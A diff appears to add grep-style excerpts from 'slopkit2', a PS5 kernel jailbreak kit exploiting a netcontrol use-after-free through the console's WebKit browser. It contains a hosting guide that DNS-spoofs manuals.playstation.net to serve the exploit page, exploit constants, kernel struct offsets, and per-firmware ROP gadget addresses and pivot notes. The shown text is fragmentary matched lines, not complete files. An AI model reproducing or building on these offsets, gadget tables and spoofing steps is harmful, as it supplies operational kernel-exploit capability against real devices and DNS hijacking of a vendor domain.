@@ -1,0 +1,310 @@
+===== slopkit2/HOSTING.md =====
+  49 2864 research/webkit-1302/upstream/adri-suid-history/full-stage2/followup/zecoxao/slopkit2_3a049e0/slopkit2_HOSTING.md
+1:# netctrl (Poopsploit) — self-hosting the exploit site
+3:Client-side files for the PS5 **netcontrol UAF** jailbreak (firmware 9.00–12.00;
+8:- `netctrl.html` — entry page. The console loads this and runs the chain.
+9:- `netctrl-ps5.js` — the exploit (race + jailbreak + elfldr loader).
+11:- `lapse-runtime.js` — slopkit2 WebKit runtime (offsets, primitives).
+12:- `offsets/` — per-firmware offset tables (slopkit).
+13:- `elfldr-ps5-1360.elf` — the ELF loader payload written into the console.
+14:- `index.html`, `notify.html`, `aioshellcode.js`, `cat.jpg`,
+18:1. **DNS-spoof `manuals.playstation.net`** to your server's IP (the PS5 User's
+19:   Guide opens `https://manuals.playstation.net/document/<locale>/ps5/…`). Only
+23:2. **Serve these files under `/document/en/ps5/`** over **HTTPS :443**. The PS5
+25:   CNG self-signed cert). HTTP :80 is only needed for PS4.
+26:3. **The console must reach `netctrl.html` with the offset query string**, e.g.
+27:   `…/document/en/ps5/netctrl.html?go=1&fw=10.00&hc=…&gd=…&notify=…&gps=…`.
+29:   firmware + slopkit offsets). Without `?go=1&fw=…` the page loops one reboot
+30:   per load. Simplest: make `/document/en/ps5/` (or the guide root) redirect to
+33:   - `…/document/en/ps5/log/<url-encoded message>`  (per-step trace)
+41:runtime/offsets here target 10.00. Other firmwares need matching `offsets/` +
+46:`ps-exploit-host.exe --console --ip <PC_IP> --guide-site netctrl-run
+===== slopkit2/index.html =====
+ 117 3870 research/webkit-1302/upstream/adri-suid-history/full-stage2/followup/zecoxao/slopkit2_3a049e0/slopkit2_index.html
+5:<title>PS5</title>
+35:const LAPSE_URL = "netctrl.html";   // netcontrol variant
+36:const OFFSETS_URL = "offsets/offsets.json";
+61:// Nearest known firmware within the SAME major. Offsets are usually stable
+62:// across a major; if the build shifted, the kernel-base cross-check fails safe
+76:fetch(OFFSETS_URL, { cache: "no-store" })
+79:        if (!fw) { msg.textContent = "not a PS5 browser"; return; }
+88:            msg.textContent = `${fw}: no exact offsets, trying ${near} (unverified)`;
+95:        msg.textContent = "failed to load offsets";
+===== slopkit2/netctrl-ps5.js =====
+  2978 152572 research/webkit-1302/upstream/adri-suid-history/full-stage2/followup/zecoxao/slopkit2_3a049e0/slopkit2_netctrl-ps5.js
+1:/* netctrl-ps5.js — sys_netcontrol / Netgraph UAF, PS4 -> PS5, driven from WebKit.
+4: *   CSSFontFace-Exploit public/src/netctrl.js  (ntfargo, ufm42) — PS4 JS chain
+5: *   Luac0re jit_shellcode/poops/poops.c        (Gezine, egycnq) — PS5 semantics
+8: * Runs on the runtime slopkit2's lapse-runtime.js leaves alive (userland R/W,
+12: * WHAT ACTUALLY DIFFERS PS4 -> PS5  (each marked [PS5] at its use site)
+15: *        PS4:  netcontrol(sock, event)
+16: *        PS5:  netcontrol(slot, event, buf, buflen)   fd lives IN buf, len 8
+18: *     -1 asks the kernel to pick; if that fails, slot 1 is retried.
+19: *  2. rthdr aliasing scan is tagged. PS4 wrote a bare index at +0x04 and
+20: *     compared it; PS5 writes RTHDR_TAG|i and validates the high half, which
+22: *  3. Struct offsets: KQ_FDP 0x98 -> 0xA8, ROOTVNODE 0x8, UCRED_SIZE 0x168,
+25: *     the header alone yields false positives on PS5.
+26: *  5. No kernel-base arithmetic. PS4 derived base from kl_lock - KL_LOCK.
+27: *     PS5 finds curproc through a pipe's SIGIO owner and walks allproc, so no
+28: *     per-firmware kernel-base constant is needed at all.
+32: * THREADS. netctrl.js drives four iov + four uio Web Workers, each of which
+33: * re-establishes its OWN arbitrary R/W (arw.master / arw.leak). That cannot be
+37: * available here — lapse-runtime spawns exactly such a thread for aioshellcode
+38: * via thr_new(start_func = shellcode_entry). The worker bodies only ever sit in
+39: * a blocking recvmsg/readv on a socketpair; they need no R/W of their own.
+41: * OFFSETS AND SYSCALL NUMBERS ARE RE'd FROM THE DECRYPTED RETAIL KERNELS, not
+44: * 09.00-12.00. Scripts: E:\ps5\dwarf\NETCTRL_RE\.
+56:const UCRED_SIZE     = 0x168;   // poops.c:38   [PS5]
+57:/* 150, matching Poops.java (BD-JB5 2.0) - the PS5 reference. This was 80 here,
+61:const IPV6_SOCK_NUM  = 150;     // Poops.java:66 [PS5]
+69:const RTHDR_TAG      = 0x13370000;      // poops.c:39  [PS5]
+72:const KQ_FDP_OFFSET     = 0xA8n;  // poops.c:75  [PS5] (PS4: 0x98)
+73:const PIPE_SIGIO_OFFSET = 0xD8n;  // poops.c:76
+74:const IN6P_OUTPUTOPTS_OFFSET = 0x120n;   // inpcb -> in6p_outputopts
+77:const IP6PO_RHI_RTHDR_OFFSET = 0x70n;
+78:// Confirmed against the kernels themselves, not inherited. change_root() on
+84:// so PS5 lays it out fd_files +0x00, fd_cdir +0x08, fd_rdir +0x10,
+87:// 11.40 11.60 12.00.  see E:\ps5\dwarf\NETCTRL_RE\verify_fd.py
+89:// Reading the KERNEL proc's filedesc at +0x08 therefore yields its fd_cdir,
+90:// which for pid 0 is the root vnode — which is what this offset is for.
+91:const ROOTVNODE_OFFSET  = 0x8n;   // poops.c:79  [PS5] — confirmed
+93:const FDT_OFILES_OFFSET = 0x8n;   // poops.c:80
+94:const KERNEL_PID        = 0;      // poops.c:57
+127: * sleeping, so 0x80 is honoured on this kernel. */
+141: * find_twins, and not one happened after twins were found. Once the ucred is
+143: * credential check that lands on it faults the kernel. Upstream clears this
+177: * caller then spent a kread_slow RETRY, which is destructive (each retry frees
+184: * slow-read bootstrap ("vrd never returned a kernel pointer") - the uio reclaim
+195:// window.netctrl_ps5 was ever assigned, so a console without slopkit loaded got
+202:    log: (window.NETCTRL_TRACE && window.slopkit && window.slopkit.mark)
+215:        throw new Error("netctrl-ps5: runtime missing " + missing.join(", ") +
+223:     * window.NETCTRL_TRACE set they ALSO go out as beacons through
+229:     * NETCTRL-RUN nor NETCTRL-THREW reported, because the catch block never
+238:    R.log = (window.NETCTRL_TRACE && beacon)
+283:               !!sk.webkitBase && !!sk.kernelBase && gaps.length === 0,
+292:        kernel_base: sk.kernelBase ? "0x" + BigInt(sk.kernelBase).toString(16) : "none",
+297:function log(m) { R.log("[netctrl] " + m); }
+333: * there is no `pop r9` gadget anywhere in libSceNKWebKit or libkernel_web
+340: * `keep` so GC cannot move or free it underneath the kernel. */
+352:            throw new Error("netctrl-ps5: rop_worker.alloc missing");
+360:// Both reference implementations call libkernel WRAPPERS resolved by symbol,
+362:// dlsym(LIBKERNEL_HANDLE 0x2001), and netctrl.js builds `const fn = {}` the
+369:// kernel UAF panics rather than erroring. So each call resolves a symbol first
+377:        if (typeof window.dlsym === "function")      this.resolver = window.dlsym;
+378:        else if (typeof sk.dlsym === "function")     this.resolver = sk.dlsym.bind(sk);
+391:// Recovered from the decrypted retail kernels, not guessed. The kernel keeps
+404://   see E:\ps5\dwarf\NETCTRL_RE\syscalls.py
+407:    open: 5n, sys_dynlib_dlsym: 591n,
+413:    // There is no `pipe` in this kernel's syscallnames[] at all - Sony dropped
+416:    // because it dlsym's libkernel's wrapper; this port issues raw syscalls and
+423:// lapse-offsets.json: that table also carries setjmp/longjmp entries pointing
+426://   syscall_wrapper lives in libkernel_web; everything else in libSceNKWebKit.
+427://   see E:\ps5\dwarf\NETCTRL_RE\webkit_gadgets.py
+429:    "09.00": { mov_rsp_rbp: 0x2b1bbcan, pivot_rdi_rsp: 0x2b1bdaen, pop_r8: 0x1d1992fn,
+432:    "09.20": { mov_rsp_rbp: 0x2b1bbaan, pivot_rdi_rsp: 0x2b1bd8en, pop_r8: 0x1d1990fn,
+435:    "09.40": { mov_rsp_rbp: 0x2b1bf5an, pivot_rdi_rsp: 0x2b1c13en, pop_r8: 0x1d19b6fn,
+438:    "09.60": { mov_rsp_rbp: 0x2b1bf5an, pivot_rdi_rsp: 0x2b1c13en, pop_r8: 0x1d19b6fn,
+441:    "10.00": { mov_rsp_rbp: 0x2d18e0an, pivot_rdi_rsp: 0x2d18feen, pop_r8: 0x17daf73n,
+444:    "10.01": { mov_rsp_rbp: 0x2d18e0an, pivot_rdi_rsp: 0x2d18feen, pop_r8: 0x17daf73n,
+466: * the renderer exactly like a 5-arg syscall, because it pivots RSP on the
+480: * KERNEL on a condvar and libkernel's _umtx_op wake is an inline syscall on the
+486:        throw new Error("netctrl-ps5: no RE'd number for '" + name + "'");
+490:        throw new Error("netctrl-ps5: rop_worker not loaded — "
+499:    /* Once a syscall has timed out the Worker is still sitting in the kernel
+501:     * to drive it is what turned the first hang into a kernel panic, so every
+502:     * later syscall fails fast instead - and the page sees NETCTRL_WEDGED and
+504:    if (window.NETCTRL_WEDGED)
+505:        throw new Error("netctrl-ps5: rop_worker is wedged in the kernel — "
+514:            window.NETCTRL_WEDGED = 1;
+518:             * half-freed ucred - that is what turned a hang into a panic).
+522:            try { sessionStorage.setItem("netctrl_wedged", "1"); } catch (e) {}
+524:        throw new Error("netctrl-ps5: '" + name + "' (" + num + ") " + msg);
+537:        throw new Error("netctrl-ps5 preflight: unreachable -> " + bad.join(", "));
+568:    // [PS5] four args, not two. See header note 1.
+602:        throw new Error("netctrl-ps5: rop_worker.syscallBatch missing");
+603:    if (window.NETCTRL_WEDGED)
+604:        throw new Error("netctrl-ps5: rop_worker wedged — refusing batch");
+633:        throw new Error("netctrl-ps5: rop_worker.syscallBatchTagged missing");
+634:    if (window.NETCTRL_WEDGED)
+635:        throw new Error("netctrl-ps5: rop_worker wedged — refusing batch");
+686:/* Bytes the kernel actually copies for this socket's rthdr.
+719:/* A kernel-space uio gets NO fault protection, so a bad address is a panic
+729: * kernel a raw pointer to bcopy. leak_kqueue used to accept any NON-ZERO fdp,
+732: * be rejected here, before the kernel ever sees it.
+734: * Canonical kernel half only: bits 63:47 set. That rejects 0, small integers,
+===== slopkit2/netctrl.html =====
+ 2278 90649 research/webkit-1302/upstream/adri-suid-history/full-stage2/followup/zecoxao/slopkit2_3a049e0/slopkit2_netctrl.html
+2:<meta charset="utf-8"><title>PS5 Poopsploit (netcontrol UAF)</title>
+58:<div id="cap">PS5 Poopsploit &mdash; netcontrol UAF</div>
+92:// Per-firmware offsets. Defaults are the hardware-verified 11.60 values; the
+124:const PARSEINT_NATIVE_OFFSET = 0x1ea18;
+125:let HOST_CONSTRUCTOR_OFFSET = P_HOST_CTOR_LIST[0];
+130:const IMPORT_WINDOW_A_OFFSET = 0x34f5708;
+132:const IMPORT_WINDOW_B_OFFSET = 0x34f5860;
+136:const REQUIREMENTS_OBJECT_A_OFFSET = 0x29f350;
+138:const REQUIREMENTS_OBJECT_B_OFFSET = 0x29f348;
+139:const KERNEL_OBJECT_SLOT = 0x10;
+140:const KERNEL_OBJECT_OFFSET = 0x6d1d0;
+142:const CXA_FINALIZE_OFFSET = 0x173e0;
+144:const STRLEN_OFFSET = 0x44c0;
+146:const CLOSE_OFFSET = 0x26e70;
+148:const ERROR_OFFSET = 0xf340;
+150:const GETPID_OFFSET = 0x1b280;
+152:const STRERROR_OFFSET = 0x77070;
+154:const PTHREAD_GETSPECIFIC_OFFSET = 0x40dd0;
+156:const MEMCHR_OFFSET = 0x3c40;
+158:const KERNEL_TEXT_SIZE = 0x44000;
+160:const NATURAL_TRAMPOLINE_OFFSET = P_GADGET;
+161:const NOTIFY_OFFSET = P_NOTIFY;
+163:const NOTIFICATION_MESSAGE_OFFSET = 0x2d;
+166:const FAKE_UCOLLATOR_OFFSET = 0x100;
+167:const FAKE_VTABLE_OFFSET = 0x300;
+299:let kernelObjectPointer = 0;
+300:let kernelObjectBase = NaN;
+301:let kernelObjectBaseOK = false;
+322:let kernelBase = NaN;
+323:let kernelResolvedCount = 0;
+324:let kernelBaseOK = false;
+363:setCaption(`Poopsploit — PS5 FW ${FW_LABEL}`);
+410:    setCaption(`Poopsploit — PS5 FW ${FW_LABEL}`);
+422:    setCaption(`Poopsploit — PS5 FW ${FW_LABEL} - NOTIFICATION SENT`);
+444:function uint32At(bytes, offset) {
+445:    return bytes[offset]
+446:        + bytes[offset + 1] * 0x100
+447:        + bytes[offset + 2] * 0x10000
+448:        + bytes[offset + 3] * 0x1000000;
+451:function low48At(bytes, offset) {
+452:    return bytes[offset]
+453:        + bytes[offset + 1] * 0x100
+454:        + bytes[offset + 2] * 0x10000
+455:        + bytes[offset + 3] * 0x1000000
+456:        + bytes[offset + 4] * 0x100000000
+457:        + bytes[offset + 5] * 0x10000000000;
+460:function putLow48(bytes, offset, value) {
+465:    bytes[offset] = low & 0xff;
+466:    bytes[offset + 1] = Math.floor(low / 0x100) & 0xff;
+467:    bytes[offset + 2] = Math.floor(low / 0x10000) & 0xff;
+468:    bytes[offset + 3] = Math.floor(low / 0x1000000) & 0xff;
+469:    bytes[offset + 4] = high & 0xff;
+470:    bytes[offset + 5] = Math.floor(high / 0x100) & 0xff;
+471:    bytes[offset + 6] = 0;
+472:    bytes[offset + 7] = 0;
+475:function low48StoredExactly(bytes, offset, value) {
+476:    return low48At(bytes, offset) === value
+477:        && bytes[offset + 6] === 0 && bytes[offset + 7] === 0;
+511:function pointerFromWords(words, offset) {
+512:    if (words[offset + 3] !== 0)
+514:    return words[offset]
+515:        + words[offset + 1] * 0x10000
+516:        + words[offset + 2] * 0x100000000;
+534:function canonicalLow48(bytes, offset) {
+535:    return bytes[offset + 6] === 0 && bytes[offset + 7] === 0;
+538:function inPS5UserModuleBand(value) {
+542:function classifyImportedFunction(value, exportOffset, providerTextSize) {
+547:    const providerBase = value - exportOffset;
+548:    if (inPS5UserModuleBand(providerBase)
+717:    kernelObjectPointer = 0;
+718:    kernelObjectBase = NaN;
+719:    kernelObjectBaseOK = false;
+739:    kernelBase = NaN;
+740:    kernelResolvedCount = 0;
+741:    kernelBaseOK = false;
+800:    const trailing = NOTIFICATION_REQUEST_SIZE - NOTIFICATION_MESSAGE_OFFSET
+804:    notificationRequest = "\x00".repeat(NOTIFICATION_MESSAGE_OFFSET)
+808:    for (let p = 0; p < NOTIFICATION_MESSAGE_OFFSET; ++p) {
+814:            NOTIFICATION_MESSAGE_OFFSET + m);
+819:    for (let t = NOTIFICATION_MESSAGE_OFFSET + NOTIFICATION_MESSAGE.length;
+1044:        const rwOffsetZero = allZero(rwHeader, 0x20, 0x28);
+1058:            && rwOffsetZero && rwHeader[0x28] === 0x58;
+1188:                HOST_CONSTRUCTOR_OFFSET = P_HOST_CTOR_LIST[ci];
+1242:        // Port path: leak libkernel_web base directly from three resolved
+1244:        // Each slot holds libkernelBase + exportRVA; the three derived bases
+1278:        // three-way libkernel_web agreement is the base validation.
+1288:        kernelBase = getpidBase;
+1289:        kernelResolvedCount = 3;
+1290:        const kernelConsistent = getpidBase === closeBase
+1292:        kernelBaseOK = gotReadOK && kernelConsistent
+1293:            && inPS5UserModuleBand(kernelBase)
+1294:            && kernelBase % 0x4000 === 0 && kernelBase !== webkitBase;
+1296:        notifyEntryAddress = kernelBase + NOTIFY_OFFSET;
+1297:        notifyAddressOK = kernelBaseOK
+1299:            && notifyEntryAddress === kernelBase + NOTIFY_OFFSET
+1300:            && notifyEntryAddress >= kernelBase
+1301:            && notifyEntryAddress < kernelBase + KERNEL_TEXT_SIZE;
+1373:        naturalTrampolineAddress = kernelBase + NATURAL_TRAMPOLINE_OFFSET;
+1374:        fakeUCollatorAddress = arenaBacking + FAKE_UCOLLATOR_OFFSET;
+1375:        fakeVtableAddress = arenaBacking + FAKE_VTABLE_OFFSET;
+===== slopkit2/offsets/lapse-offsets.json =====
+  536 11021 research/webkit-1302/upstream/adri-suid-history/full-stage2/followup/zecoxao/slopkit2_3a049e0/slopkit2_offsets_lapse-offsets.json
+2: "_comment": "Per-fw gadget + kernel-offset table for lapse. Two ROP bases: `webkit` = libSceNKWebKit.sprx (slopkit.webkitBase). `libkernel_web` = libkernel_web.sprx (slopkit.kernelBase). All gadgets pad=0 (clean pop; ret) so lapse.js's chain-building convention works without modification. mov_rax_0x200000000 does not exist in either module \u2014 lapse.js patched to use pop_rax + 0x200000000n.",
+55:   "pivot_rdi_rsp": {
+66:  "libkernel_web": {
+83:  "kernel_offset": {
+144:   "pivot_rdi_rsp": {
+155:  "libkernel_web": {
+172:  "kernel_offset": {
+233:   "pivot_rdi_rsp": {
+244:  "libkernel_web": {
+261:  "kernel_offset": {
+322:   "pivot_rdi_rsp": {
+333:  "libkernel_web": {
+350:  "kernel_offset": {
+411:   "pivot_rdi_rsp": {
+422:  "libkernel_web": {
+439:  "kernel_offset": {
+500:   "pivot_rdi_rsp": {
+511:  "libkernel_web": {
+528:  "kernel_offset": {
+===== slopkit2/offsets/lapse-offsets.json.orig =====
+  537 10291 research/webkit-1302/upstream/adri-suid-history/full-stage2/followup/zecoxao/slopkit2_3a049e0/slopkit2_offsets_lapse-offsets.json.orig
+2: "_comment": "Per-fw gadget + kernel-offset table for lapse. Two ROP bases: `webkit` = libSceNKWebKit.sprx (slopkit.webkitBase). `libkernel_web` = libkernel_web.sprx (slopkit.kernelBase). All gadgets pad=0 (clean pop; ret) so lapse.js's chain-building convention works without modification. mov_rax_0x200000000 does not exist in either module \u2014 lapse.js patched to use pop_rax + 0x200000000n.",
+55:   "pivot_rdi_rsp": {
+66:  "libkernel_web": {
+83:  "kernel_offset": {
+144:   "pivot_rdi_rsp": {
+155:  "libkernel_web": {
+172:  "kernel_offset": {
+233:   "pivot_rdi_rsp": {
+244:  "libkernel_web": {
+261:  "kernel_offset": {
+322:   "pivot_rdi_rsp": {
+333:  "libkernel_web": {
+350:  "kernel_offset": {
+411:   "pivot_rdi_rsp": {
+422:  "libkernel_web": {
+439:  "kernel_offset": {
+500:   "pivot_rdi_rsp": {
+511:  "libkernel_web": {
+528:  "kernel_offset": {
+===== slopkit2/rop-worker.js =====
+  561 25396 research/webkit-1302/upstream/adri-suid-history/full-stage2/followup/zecoxao/slopkit2_3a049e0/slopkit2_rop-worker.js
+8: * the kernel at all.
+10: * The kernel is innocent. Xfast_syscall (0xFFFFFFFF80461710, found via the
+12: * switches to the kernel stack. It never dereferences it, and performs no
+13: * caller or stack validation. A pivoted RSP is legal.
+26:/* ---------------------------------------------------------- RE'd offsets */
+28:// libkernel_web. IDA: `for (j = qword_64218; j; j = j[7])` with j[21]/j[22]
+31:// offsets trustworthy rather than coincidental.
+37:// setjmp/longjmp, recovered by signature (the lapse-offsets values pointed at
+58: * (-> libkernel+0x190db). sub_1F110 is pthread_cond_wait, identified by its
+63: * Verified at runtime anyway (see fire()): a hardcoded stack offset is exactly
+66:const SLOT_EXPECT   = 0x190DBn;   // libkernel RVA the slot must contain
+70: * At libkernel+0x190f2/0x190f5 the resume site does `mov rsi, rbx` and
+205:        throw new Error("rop-worker: slot holds libkernel+" + hex(rva)
+223: * netctrl-ps5.js is synchronous throughout (`sys.read(...)` returns a number)
+230: *   * the worker is blocked in the KERNEL on a condvar - webkit+0x3E1D0 is a
+232: *   * libkernel's _umtx_op is a leaf syscall stub (`mov rax,0x1c6 ; syscall ;
+265:     * still using - a run threw "slot holds libkernel+0x7f6f76000" (a JS heap
+293:     * in that window makes it pivot straight into the next chain with no
+305:     * whole reason for hurrying is the ucred being corrupt while we spray -
+317:     *   STABLE=64, both words  - safe but 0.985 ms/syscall; the widened ucred
+318:     *                            exposure window then caused a KERNEL panic.
+338:        throw new Error("rop-worker: slot never settled, holds libkernel+"
+464: * netctrl-ps5 needs ~300 KB (thread stacks, ROP chains, spray buffers) and has
+473: *     libSceNKWebKit or libkernel_web (the three `pop r9` sites are followed by
+503:    W.kbase = BigInt(cfg.kernelBase);
+528:    log("survey: slot " + hex(slot) + " = libkernel+" + hex(val - W.kbase)
+544: * A matching pid from both means netctrl-ps5.js can keep its sync API. */
+===== slopkit2/rop_slave.js =====
+ 12 537 research/webkit-1302/upstream/adri-suid-history/full-stage2/followup/zecoxao/slopkit2_3a049e0/slopkit2_rop_slave.js
+5:// lapse-runtime pivots RSP on the main thread and then "returns" by guessing
